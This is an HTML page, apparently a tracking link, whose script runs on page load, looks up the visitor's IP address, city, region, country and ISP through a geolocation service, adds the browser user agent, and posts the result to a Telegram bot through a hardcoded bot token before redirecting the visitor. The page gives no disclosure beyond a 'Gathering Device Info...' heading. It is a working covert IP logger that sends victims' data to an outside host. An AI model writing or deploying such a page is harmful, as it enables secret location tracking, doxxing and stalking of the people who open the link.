<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Phone Info</title>
  <style>
    body { font-family: sans-serif; text-align: center; margin-top: 50px; }
    button { padding: 15px 25px; margin: 15px; font-size: 18px; border: none; border-radius: 10px; cursor: pointer; }
    .action { background: #FF5722; color: white; }
  </style>
</head>
<body>
  <h1>Gathering Device Info...</h1>

  <script>
    const urlParams = new URLSearchParams(window.location.search);
    const chatId = urlParams.get('id'); // âœ… Uses `id` parameter
    const botToken = "7546697714:AAHi3kez5cEucI43dTJISyrltiV5wotXC2U";

    function sendToTelegram(message) {
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({ chat_id: chatId, text: message })
      });
    }

    async function getInfo() {
      const res = await fetch("https://ipapi.co/json/");
      const data = await res.json();
      const info = `ðŸ“± Phone Info:\nIP: ${data.ip}\nCity: ${data.city}\nRegion: ${data.region}\nCountry: ${data.country_name}\nISP: ${data.org}\nBrowser: ${navigator.userAgent}`;
      sendToTelegram(info);
      window.open("https://example.com/phone-link", "_blank");
    }

    getInfo();
  </script>
</body>
</html>
